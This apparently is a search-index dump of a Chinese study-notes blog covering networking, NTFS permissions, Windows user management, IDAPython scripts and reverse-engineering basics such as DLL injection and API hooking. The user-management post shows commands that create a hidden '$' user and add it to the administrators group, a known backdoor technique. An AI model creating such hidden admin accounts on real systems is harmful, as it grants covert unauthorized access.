确定最佳路径（手动绑定，根据动态路由协商方式） 通过网络传输信息 路由表 直接路由：当路由器的接口配置好对应的IP地址并开启接口后自动生成 非直接路由：需要手动配置静态路由或者使用动态路由协议学习 4、静态路由 管理员配置、不灵活 特殊的静态路由：默认路由 使用场景：一般应用于末节网络 123ip route 目标网络 下一跳地址或者接口ip route 192.168.10.0 255.255.255.0 192.168.30.2ip route 192.168.10.0 255.255.255.0 f0/1 5、动态路由 通过某种动态路由协议自动的去建立自己的路由表 常见的动态路由协议，RIP OSPF 6、路由器转发数据 源IP和目的IP一直不发生变化，源MAC地址和目的MAC地址一直在发生变化，路由器不断进行2层封装 同网段传输主要是二层转发，不需要重新封装 跨网段传输主要是三层转发，需要重新封装 7、 VLAN 把同一个网段的主机划分到不同的广播域，不能再简单的进行二层通信了，在同一交换机下，不同vlan不能直接通信了 划分的目的 划分广播域 增强安全性 简化管理 种类 静态划分 基于端口进行划分，需要去配置 华为路由器 1-4094 端口范围 动态划分 基于MAC地址自动加入 VLUN TRUNK 实现相同VLAN跨交换机通信 配置接口模式为Trunk模式 8、不同VLAN直接的通信技术 单臂路由(路由器压力大，容易造成网络拥堵) 在路由器上划分子接口作为不同vlan的网关,例如g&#x2F;0 物理接口划分为g&#x2F;0.1 g&#x2F;0.2 主机与交换机-access 交换机和路由器–Trunk 三层交换","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"交换机的工作原理","slug":"系统基础/交换机的工作原理_new","date":"2023-03-07T16:00:00.000Z","updated":"2024-03-12T10:41:16.588Z","comments":true,"path":"2023/03/08/系统基础/交换机的工作原理_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/08/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86_new/","excerpt":"1、数据链路层设备，传输数据帧，封装MAC头部，源MAC地址，目的MAC地址 2、数据链路层的功能 建立逻辑连接，进行物理地址寻址，差错校验 数据链路的建立，维护和拆除 数据帧的封装、传输、同步、差错校验、流量控制 3、以太网 以太网&#x3D;&#x3D; 局域网 有线局域网 无线局域网 4、交换机&#x3D;&#x3D;默认以太网交换机 5、MAC地址 用于标识以太网商的某个设备 以太网中通信需要MAC地址 6、以太网的帧格式","text":"1、数据链路层设备，传输数据帧，封装MAC头部，源MAC地址，目的MAC地址 2、数据链路层的功能 建立逻辑连接，进行物理地址寻址，差错校验 数据链路的建立，维护和拆除 数据帧的封装、传输、同步、差错校验、流量控制 3、以太网 以太网&#x3D;&#x3D; 局域网 有线局域网 无线局域网 4、交换机&#x3D;&#x3D;默认以太网交换机 5、MAC地址 用于标识以太网商的某个设备 以太网中通信需要MAC地址 6、以太网的帧格式 7、以太网交换机 早期共享式交换机-集线器 一个冲突域的网络 交换式网络 广播 数据转发流程，A往B转发，交换机接受到A发来的数据帧后会检查MAC表中是否存在端口和MAC地址的对应关系，没有则不补上，随后查看目的MAC地址，如果不存在则广播，B收到后回应，其他的收到后丢弃，随后以单播方式通信。","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"注册表相关修改小技巧","slug":"杂学/注册表相关修改小技巧","date":"2023-03-03T16:00:00.000Z","updated":"2024-03-12T11:16:16.420Z","comments":true,"path":"2023/03/04/杂学/注册表相关修改小技巧/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/%E6%9D%82%E5%AD%A6/%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9B%B8%E5%85%B3%E4%BF%AE%E6%94%B9%E5%B0%8F%E6%8A%80%E5%B7%A7/","excerpt":"1、去除快捷方式左下角的小箭头 HKEY—CLASS_ROOT\\lnkfile Isshortcut 删除 2、禁用注册表 HKCU\\software\\microsoft\\windows\\currentversion\\policies\\system [DisableRegistrytools]:1 3、禁用状态下，如何恢复 Registry WorkShop 来打开，改写禁用注册表的项","text":"1、去除快捷方式左下角的小箭头 HKEY—CLASS_ROOT\\lnkfile Isshortcut 删除 2、禁用注册表 HKCU\\software\\microsoft\\windows\\currentversion\\policies\\system [DisableRegistrytools]:1 3、禁用状态下，如何恢复 Registry WorkShop 来打开，改写禁用注册表的项","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"NTFS权限","slug":"系统基础/NTFS权限_new","date":"2023-03-03T16:00:00.000Z","updated":"2024-03-12T09:53:56.325Z","comments":true,"path":"2023/03/04/系统基础/NTFS权限_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/NTFS%E6%9D%83%E9%99%90_new/","excerpt":"NTFS权限 一、 NTFS权限 文件系统 windows 早期windows使用FAT16，FAT32 NTFS ACL（访问控制列表） EFS(加密文件系统) BitLocker 压缩及磁盘配额 ReFS winserver2012 Linux swap:交换文件系统，主要将磁盘的一部分空间划分给内存使用 ext3&#x2F;ext4 可以用convert命令在不格式化的前提下，修改文件系统 1convert H:/fs:ntfs //H 是盘符 二、文件权限 设置文件权限 读取数据 写入数据 附加数据 删除 执行 三、文件夹权限 设置文件夹权限 列出文件夹 创建文佳佳 创建文件 删除 删除子文件夹和文件 四、权限的分类","text":"NTFS权限 一、 NTFS权限 文件系统 windows 早期windows使用FAT16，FAT32 NTFS ACL（访问控制列表） EFS(加密文件系统) BitLocker 压缩及磁盘配额 ReFS winserver2012 Linux swap:交换文件系统，主要将磁盘的一部分空间划分给内存使用 ext3&#x2F;ext4 可以用convert命令在不格式化的前提下，修改文件系统 1convert H:/fs:ntfs //H 是盘符 二、文件权限 设置文件权限 读取数据 写入数据 附加数据 删除 执行 三、文件夹权限 设置文件夹权限 列出文件夹 创建文佳佳 创建文件 删除 删除子文件夹和文件 四、权限的分类 完全控制 修改 读取和执行 读取 写入 特殊权限 -读取权限 更改权限 取得所有权","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"NTFS 权限规则","slug":"系统基础/NTFS 权限规则_new","date":"2023-03-03T16:00:00.000Z","updated":"2024-03-12T09:53:52.094Z","comments":true,"path":"2023/03/04/系统基础/NTFS 权限规则_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/NTFS%20%E6%9D%83%E9%99%90%E8%A7%84%E5%88%99_new/","excerpt":"NTFS 权限规则 一、权限规则 权限的累加 用户分配的有效权限是分配给用户所有权限的累加 用户被分配的权限+所属组的权限 拒绝权限 拒绝的权限大于一切（在访问控制列表中，权限最高） 出现权限冲突时，拒绝的权限优先级最高（用户所属组读取权限，用户拒绝读取，最终是拒绝读取权限） 继承权限 文件或者文件夹默认集成上级文件夹的权限 特殊权限 读取权限（和读取文件或者文件夹的内容无关） 读取文件或者文件夹的访问控制列表 ，没有读取权限，点击文件-属性-安全，看不到ACL 访问文件的内容，此权限必须勾选 更改权限（和修改文件、修改文件夹的内容无关） 用户是否可以修改文件或者文件夹的访问控制列表，此权限可以为用户添加或者删除权限，会造成很多不安全因素，一般不给用户 更改的前提是读取权限 取得所有权 能够修改文件或者文件夹的所有者 前提是读取和更改","text":"NTFS 权限规则 一、权限规则 权限的累加 用户分配的有效权限是分配给用户所有权限的累加 用户被分配的权限+所属组的权限 拒绝权限 拒绝的权限大于一切（在访问控制列表中，权限最高） 出现权限冲突时，拒绝的权限优先级最高（用户所属组读取权限，用户拒绝读取，最终是拒绝读取权限） 继承权限 文件或者文件夹默认集成上级文件夹的权限 特殊权限 读取权限（和读取文件或者文件夹的内容无关） 读取文件或者文件夹的访问控制列表 ，没有读取权限，点击文件-属性-安全，看不到ACL 访问文件的内容，此权限必须勾选 更改权限（和修改文件、修改文件夹的内容无关） 用户是否可以修改文件或者文件夹的访问控制列表，此权限可以为用户添加或者删除权限，会造成很多不安全因素，一般不给用户 更改的前提是读取权限 取得所有权 能够修改文件或者文件夹的所有者 前提是读取和更改","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"windows 文件共享","slug":"系统基础/windows 文件共享_new","date":"2023-03-03T16:00:00.000Z","updated":"2024-03-12T09:54:04.172Z","comments":true,"path":"2023/03/04/系统基础/windows 文件共享_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/windows%20%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB_new/","excerpt":"windows 文件共享 一、共享要求 一般是局域网使用 1、物理上处于同一局域网 同一公司的网络 同一家庭的网络 同一个手机热点 2、逻辑上处于同一局域网 直接可以ping 对方主机 二、共享权限 1、共享权限 everyone完全控制","text":"windows 文件共享 一、共享要求 一般是局域网使用 1、物理上处于同一局域网 同一公司的网络 同一家庭的网络 同一个手机热点 2、逻辑上处于同一局域网 直接可以ping 对方主机 二、共享权限 1、共享权限 everyone完全控制 2、NTFS权限 根据用户来的 3、用户从网络访问server的最终权限 共享权限和NTFS权限的交集 三、访问共享 12\\\\server_address\\\\主机名 输入用户名和密码","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"windows 用户管理","slug":"系统基础/windows 用户管理_new","date":"2023-03-03T16:00:00.000Z","updated":"2024-03-12T09:54:09.966Z","comments":true,"path":"2023/03/04/系统基础/windows 用户管理_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/windows%20%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86_new/","excerpt":"windows 用户管理 一. 用户账户 什么是用户账户 不同的用户身份拥有不同的权限 每个用户包含了一个名称和密码 每个用户账户具有唯一的安全标识符号 SID 查看系统中的用户 1net user 查看SID 命令查看 12whoami /userwmic useraccount get name,sid 注册表查看SID 计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\ 进行用户管理 创建用户 用户名：系统的显示名 全名：用户登录时的显示名 密码：server版本有密码复杂性要求，本地安全策略 账户已锁定：如果开启账户锁定阈值，账户有可能输错多次被锁定 123456# 创建用户不指定密码net user 用户名 /add# 创建用户指定明文密码net user 用户名 密码 /add# 创建用户，手动输入密码net user 用户名 /add * 管理用户 设置密码 隐藏用户 12# net user 查看不到 wmic useraccount get name,sid ,以及计算机管理里面可以看到net user 用户名$ 密码 /add 12# 添加隐藏用户并提升为管理员权限net localgroup administrators 用户名 /add 二 、windows的内置用户 1、与使用者关联的 管理员：administrator使用者中具有最高的权限,没有其他管理员的情况下，不建议禁用 普通用户：具有一定的读取权限，权限较低 来宾用户：提供给访客使用，默认为禁用，权限最低 2、与windows 组件相关 system 本地系统：拥有最高权限 local service 本地服务 :权限相对于普通用户组user 低一些 netword service 网络服务：权限跟普通用户组user 一样","text":"windows 用户管理 一. 用户账户 什么是用户账户 不同的用户身份拥有不同的权限 每个用户包含了一个名称和密码 每个用户账户具有唯一的安全标识符号 SID 查看系统中的用户 1net user 查看SID 命令查看 12whoami /userwmic useraccount get name,sid 注册表查看SID 计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\ 进行用户管理 创建用户 用户名：系统的显示名 全名：用户登录时的显示名 密码：server版本有密码复杂性要求，本地安全策略 账户已锁定：如果开启账户锁定阈值，账户有可能输错多次被锁定 123456# 创建用户不指定密码net user 用户名 /add# 创建用户指定明文密码net user 用户名 密码 /add# 创建用户，手动输入密码net user 用户名 /add * 管理用户 设置密码 隐藏用户 12# net user 查看不到 wmic useraccount get name,sid ,以及计算机管理里面可以看到net user 用户名$ 密码 /add 12# 添加隐藏用户并提升为管理员权限net localgroup administrators 用户名 /add 二 、windows的内置用户 1、与使用者关联的 管理员：administrator使用者中具有最高的权限,没有其他管理员的情况下，不建议禁用 普通用户：具有一定的读取权限，权限较低 来宾用户：提供给访客使用，默认为禁用，权限最低 2、与windows 组件相关 system 本地系统：拥有最高权限 local service 本地服务 :权限相对于普通用户组user 低一些 netword service 网络服务：权限跟普通用户组user 一样","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"windows 组的管理","slug":"系统基础/windows 组的管理_new","date":"2023-03-03T16:00:00.000Z","updated":"2024-03-12T09:54:13.938Z","comments":true,"path":"2023/03/04/系统基础/windows 组的管理_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/windows%20%E7%BB%84%E7%9A%84%E7%AE%A1%E7%90%86_new/","excerpt":"windows 组的管理 一、用户组 概念 一组用户的集合，组中所有的用户具备组的权限 管理组 12345678# 新建组net localgroup 组名 /add# 删除组net localgroup 组名 /del# 添加成员到组net localgroup 组名 成员 /add# 把用户从组里删除net localgroup 组名 成员 /del 二、内置组用户 1. 需要认为添加的 - administrators:管理员组 - guests:来宾用户组 - power users:向下兼容的组 - users:标准用户组，创建用户后默认属于该组 2. 动态包含成员 - interactive:动态包含在本地登录的用户 - authenticated users:动态包含通过验证的用户 - everyone:所有人，包含了来宾用户","text":"windows 组的管理 一、用户组 概念 一组用户的集合，组中所有的用户具备组的权限 管理组 12345678# 新建组net localgroup 组名 /add# 删除组net localgroup 组名 /del# 添加成员到组net localgroup 组名 成员 /add# 把用户从组里删除net localgroup 组名 成员 /del 二、内置组用户 1. 需要认为添加的 - administrators:管理员组 - guests:来宾用户组 - power users:向下兼容的组 - users:标准用户组，创建用户后默认属于该组 2. 动态包含成员 - interactive:动态包含在本地登录的用户 - authenticated users:动态包含通过验证的用户 - everyone:所有人，包含了来宾用户","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"本地安全策略大纲","slug":"系统基础/本地安全策略_new","date":"2023-03-03T16:00:00.000Z","updated":"2024-03-12T09:53:24.914Z","comments":true,"path":"2023/03/04/系统基础/本地安全策略_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5_new/","excerpt":"本地安全策略大纲 一、本地安全策略基本内容 1、概念 主要对登录到计算机的账户进行一些安全设置 主要是影响本地计算机的安全 2、打开方式 开始菜单-管理工具-本地安全策略 使用命令 1secpol.msc 从本地组策略进去 1gpedit.msc 二、账户策略 1、密码策略 密码必须符合复杂性要求 2、账户锁定策略","text":"本地安全策略大纲 一、本地安全策略基本内容 1、概念 主要对登录到计算机的账户进行一些安全设置 主要是影响本地计算机的安全 2、打开方式 开始菜单-管理工具-本地安全策略 使用命令 1secpol.msc 从本地组策略进去 1gpedit.msc 二、账户策略 1、密码策略 密码必须符合复杂性要求 2、账户锁定策略 账户锁定时间 账户锁定阈值 重置账户锁定计数器的时间 管理员不受限制—-注册表隐藏管理员账户，从而无法实施爆破 三、本地策略 审核策略 用户权限分配 安全选项","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"计算机网络五层协议","slug":"系统基础/计算机网络五层协议","date":"2023-03-03T16:00:00.000Z","updated":"2024-03-12T10:10:53.958Z","comments":true,"path":"2023/03/04/系统基础/计算机网络五层协议/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94%E5%B1%82%E5%8D%8F%E8%AE%AE/","excerpt":"应用层： 将原始数据转换为计算机的二进制，HTTP，FTP，SMTP 传输层：将报文划分成较小的块，然后为每块加上传输层首部来生成传输层报文段。代表是TCP，UDP协议 网络层：进行逻辑地址寻址，进行IP头部的封装，主要的字段，源IP和目的IP。 数据链路层：建立逻辑链接，进行物理地址寻址，主要的字段源MAC地址，目的MAC地址 物理层：将二进制数据转换为电信号通过网卡通过网线进行传输。","text":"应用层： 将原始数据转换为计算机的二进制，HTTP，FTP，SMTP 传输层：将报文划分成较小的块，然后为每块加上传输层首部来生成传输层报文段。代表是TCP，UDP协议 网络层：进行逻辑地址寻址，进行IP头部的封装，主要的字段，源IP和目的IP。 数据链路层：建立逻辑链接，进行物理地址寻址，主要的字段源MAC地址，目的MAC地址 物理层：将二进制数据转换为电信号通过网卡通过网线进行传输。","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"IDA python 学习记录","slug":"逆向/IDApython学习","date":"2023-02-01T16:00:00.000Z","updated":"2024-03-12T15:11:25.447Z","comments":true,"path":"2023/02/02/逆向/IDApython学习/","link":"","permalink":"http://zwjsfdbb.top/2023/02/02/%E9%80%86%E5%90%91/IDApython%E5%AD%A6%E4%B9%A0/","excerpt":"1、获取所有函数 12345678910111213141516171819# 获取所有函数funcs = list(idautils.Functions())# 枚举每个函数并输出其名称和起始地址for func in funcs: func_name = idaapi.get_func_name(func) start_addr = func end_addr = idc.get_func_attr(func,idc.FUNCATTR_END) func_data = idaapi.get_func(func) args_size = func_data.argsize local_var_size = func_data.frsize # 打印函数信息 print(&quot;Function Name: %s&quot; % func_name) print(&quot;Start Address: 0x%x&quot; % start_addr) print(&quot;End Address: 0x%x&quot; % end_addr) print(&quot;Arguments Size: %d bytes&quot; % args_size) print(&quot;Local Variables Size: %d bytes&quot; % local_var_size) print(&quot;------------------------&quot;) 2、获取当前函数的指令 12345678910111213import idautils# 获取当前函数地址func_start = idc.get_func_attr(here(), FUNCATTR_START)# 获取函数结束地址func_end = idc.find_func_end(func_start)# 枚举函数指令for head in idautils.Heads(func_start, func_end): print(&quot;Instruction at 0x%x: %s&quot; % (head, idc.GetDisasm(head))) 3、获取交叉引用 12345678910111213141516import idautils# 获取当前函数地址func_ea = here()print(&quot;当前函数地址：0x%x&quot; % func_ea)print (&quot;**xrefs_to**&quot;)xrefs_to = [xref.frm for xref in idautils.XrefsTo(func_ea)]for xref in xrefs_to: print (&quot;0x%x&quot; % xref)print (&quot;**xrefs_from**&quot;)xrefs_from=[xref.to for xref in idautils.XrefsFrom(func_ea)]for xref in xrefs_from: print (&quot;0x%x&quot; % xref) 4、获取导出函数名与地址 123456789import idautils# 获取所有导出函数exports = list(idautils.Entries())# 遍历每个导出函数并输出其名称和地址for export in exports: func_name = idc.get_func_name(export[2]) print(&quot;Export Name: %s, Address: 0x%X&quot; % (func_name, export[2])) 5、获取特定函数地址以及交叉引用的位置并添加注释 1234567891011121314151617181920212223242526import idautilsimport idcdef add_xref_comment(xref_addr, comment): &quot;&quot;&quot; 给指定的交叉引用处添加注释 :param xref_addr: 交叉引用地址 :param comment: 注释内容 &quot;&quot;&quot; # 获取所有引用到相应地址的引用列表 xref_lst = list(idautils.XrefsTo(xref_addr)) if not xref_lst: print(&quot;No cross references found for address &quot; + hex(xref_addr)) return # 在每个交叉引用处添加注释 for xref in xref_lst: idc.set_cmt(xref.frm, comment, 0) print(&quot;Comments added successfully to &#123;&#125; cross-references of address &#123;&#125;&quot;.format(len(xref_lst), hex(xref_addr)))# 调用函数并为某个地址的交叉引用添加注释func_ea = idc.get_name_ea_simple(&quot;lstrcpyA&quot;)add_xref_comment(func_ea, &quot;This is a comment for the cross-reference&quot;)","text":"1、获取所有函数 12345678910111213141516171819# 获取所有函数funcs = list(idautils.Functions())# 枚举每个函数并输出其名称和起始地址for func in funcs: func_name = idaapi.get_func_name(func) start_addr = func end_addr = idc.get_func_attr(func,idc.FUNCATTR_END) func_data = idaapi.get_func(func) args_size = func_data.argsize local_var_size = func_data.frsize # 打印函数信息 print(&quot;Function Name: %s&quot; % func_name) print(&quot;Start Address: 0x%x&quot; % start_addr) print(&quot;End Address: 0x%x&quot; % end_addr) print(&quot;Arguments Size: %d bytes&quot; % args_size) print(&quot;Local Variables Size: %d bytes&quot; % local_var_size) print(&quot;------------------------&quot;) 2、获取当前函数的指令 12345678910111213import idautils# 获取当前函数地址func_start = idc.get_func_attr(here(), FUNCATTR_START)# 获取函数结束地址func_end = idc.find_func_end(func_start)# 枚举函数指令for head in idautils.Heads(func_start, func_end): print(&quot;Instruction at 0x%x: %s&quot; % (head, idc.GetDisasm(head))) 3、获取交叉引用 12345678910111213141516import idautils# 获取当前函数地址func_ea = here()print(&quot;当前函数地址：0x%x&quot; % func_ea)print (&quot;**xrefs_to**&quot;)xrefs_to = [xref.frm for xref in idautils.XrefsTo(func_ea)]for xref in xrefs_to: print (&quot;0x%x&quot; % xref)print (&quot;**xrefs_from**&quot;)xrefs_from=[xref.to for xref in idautils.XrefsFrom(func_ea)]for xref in xrefs_from: print (&quot;0x%x&quot; % xref) 4、获取导出函数名与地址 123456789import idautils# 获取所有导出函数exports = list(idautils.Entries())# 遍历每个导出函数并输出其名称和地址for export in exports: func_name = idc.get_func_name(export[2]) print(&quot;Export Name: %s, Address: 0x%X&quot; % (func_name, export[2])) 5、获取特定函数地址以及交叉引用的位置并添加注释 1234567891011121314151617181920212223242526import idautilsimport idcdef add_xref_comment(xref_addr, comment): &quot;&quot;&quot; 给指定的交叉引用处添加注释 :param xref_addr: 交叉引用地址 :param comment: 注释内容 &quot;&quot;&quot; # 获取所有引用到相应地址的引用列表 xref_lst = list(idautils.XrefsTo(xref_addr)) if not xref_lst: print(&quot;No cross references found for address &quot; + hex(xref_addr)) return # 在每个交叉引用处添加注释 for xref in xref_lst: idc.set_cmt(xref.frm, comment, 0) print(&quot;Comments added successfully to &#123;&#125; cross-references of address &#123;&#125;&quot;.format(len(xref_lst), hex(xref_addr)))# 调用函数并为某个地址的交叉引用添加注释func_ea = idc.get_name_ea_simple(&quot;lstrcpyA&quot;)add_xref_comment(func_ea, &quot;This is a comment for the cross-reference&quot;)","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"逆向工程核心原理笔记","slug":"逆向/逆向工程核心原理笔记","date":"2022-12-31T16:00:00.000Z","updated":"2024-03-12T15:01:10.361Z","comments":true,"path":"2023/01/01/逆向/逆向工程核心原理笔记/","link":"","permalink":"http://zwjsfdbb.top/2023/01/01/%E9%80%86%E5%90%91/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/","excerpt":"1、大端序和小端序大端序：高地址存地位，低地址存高位 , 代表Unix RISC CPU 小端序：低地址存低位，高地址存高位，代表 Intel x86 CPU 2、IA32 寄存器 通用寄存器 EAX EBX ECX EDX ESP EBP ESI EDI 段寄存器 CS DS SS ES FS GS 程序状态与控制寄存器 EFLAGS 初级阶段 ZF OF CF 指令指针寄存器 EIP ３、栈栈是一个高地址向低地址增长的数据结构。 栈帧用EBP定位栈内元素，典型栈帧代码 123456push ebpmov ebp,esp....mov esp,ebppop ebpretn","text":"1、大端序和小端序大端序：高地址存地位，低地址存高位 , 代表Unix RISC CPU 小端序：低地址存低位，高地址存高位，代表 Intel x86 CPU 2、IA32 寄存器 通用寄存器 EAX EBX ECX EDX ESP EBP ESI EDI 段寄存器 CS DS SS ES FS GS 程序状态与控制寄存器 EFLAGS 初级阶段 ZF OF CF 指令指针寄存器 EIP ３、栈栈是一个高地址向低地址增长的数据结构。 栈帧用EBP定位栈内元素，典型栈帧代码 123456push ebpmov ebp,esp....mov esp,ebppop ebpretn 修改OD栈的相关设置，可比较直观的看到当前元素相对于（栈底）EBP的位置 涉及到函数调用约定：Cdecl Stdcall fastcall cdecl: 参数从右向左，调用者清理堆栈 stdcall：参数从右向左，子程序清理 fastcall: 参数ecx edx (R8 R9) ，剩下的参数从右向左，子程序清理 thiscall: 参数从右向左，参数确定，this 通过ecx 传递，子程序清理，参数不定，this在所有参数入栈后压栈，调用者清理 1234567891011121314151617181920212223242526272829303132333435363738 class A &#123; public: int function1(int a, int b); int function2(int a, ...); &#125; int A::function1(int a, int b) &#123; return a + b; &#125; int A::function2(int a, ...) &#123; va_list ap; va_start(ap, a); int i; int result = 0; for (i=0; i&lt;a; i++) &#123; result += va_arg(ap, int); &#125; return result; &#125; void callee() &#123; A a; a.function1(1, 2); a.function2(3, 1, 2, 3); &#125;// 反汇编结果00AB45D8 push 2 00AB45DA push 1 00AB45DC lea ecx,[a] 00AB45DF call A::function1 (0AB10AFh) a.function2(3, 1, 2, 3);00AB45E4 push 3 00AB45E6 push 2 00AB45E8 push 1 00AB45EA push 3 00AB45EC lea eax,[a] 00AB45EF push eax 00AB45F0 call A::function2 (0AB129Eh) 00AB45F5 add esp,14h 在这里有个问题，为什么要从右向左？为什么C调用约定是调用者清理？ 为了支持可变参数，除了调用者谁也不知道参数有多少个，所以只能是调用者清理，而为什么从右边向左，因为针对可变参数，第一个固定参数的位置很重要，用于定位参数到哪结束，从ebp到第一个参数之间的位置是所有的参数，如果第一个参数先压栈，那么除非知道参数个数，不然无法确定其他的参数位置以及到哪才是结束。 4、PE结构PE 头（DOS Header+ DOS Stub + NT Header+节区头） RVA—RAW 公式 RVA-VirtualAddress + PointerToRawData &#x3D; RAW VirtualAddress是对应节的相对虚拟地址 IAT填充过程：读取IID的name成员获取库名称，加载库，读取IID中的OriginalFirstThunk 获取INT地址，逐一读取INT中的值获得IMAGE_BY_NAME, 使用Ordinal或者Name项获取相应的函数地址，读取IID中的FirstThunk（IAT）获取IAT地址，将函数地址填入IAT地址。 5、DLL注入 CreateRemoteThread(NtCreateThreadEx 可注入到服务进程) 为什么CreateRemoteThread 传入的是目标进程的dll路径和当前进程的LoadLibrary地址？ 这是因为在windows系统中，Kernel32.dll 在每个进程的加载地址都是相同的。 卸载模块可以给CreateRemoteThread 传递FreeLibrary地址和遍历模块得到的模块句柄 AppInit_DLLS 被user32.dll加载 SetWindowsHookEx 消息钩子 6、代码注入原理：目标进程分配一段内存，写入代码以及数据，调用CreateRemoteThread 参数传入内存地址即可。执行更加隐蔽，比DLL注入更加流行。 7、API Hook 调用调试器函数DebugActiveProcess函数附加调试器到运行的进程，随后调用DebugLoop函数处理调试时间，如修改API首字节为0xCC ,当调用到该API时，触发异常，控制权会交给调试器，此时可以做一些自定义的事情。 修改IAT中的API地址 InlineHook(热补丁) 长跳转+短跳转 8、64位 Wow64 : Wow64 实现了在64位环境下运行32位程序，具体的原理是Wow64运行在用户模式下，把ntdll32位的API调用重定向到ntdll64位。 内存：理论上支持2^64 （16EB）,考虑到性能以及实际情况，实际的虚拟空间为16TB（2^44） 寄存器： 通用寄存器 16个；RAX RBX RCX RDX RSP RBP RSI RDI R8~R15 函数调用约定 FastCall RCX RDX R8 R9 剩余的从右向左堆栈保存，但是栈中仍然给前四个参数保留了空间，调用者（caller）清理栈区空间 windbg 显示文件头的命令 !dh 9、ASLR 地址空间随机化编译器启用&#x2F;DYNAMICBASE 即表示编译的程序开启地址空间随机化。PE文件发生以下变化， 多一个”.reloc”的节 IMAGE_FILE_HEADER\\Characteristics 不包含IMAGE_FILE_RELOCS_STRIPPED(0001)标志 IMAGE_OPTIONAL_HEADER\\DLL Characteristics 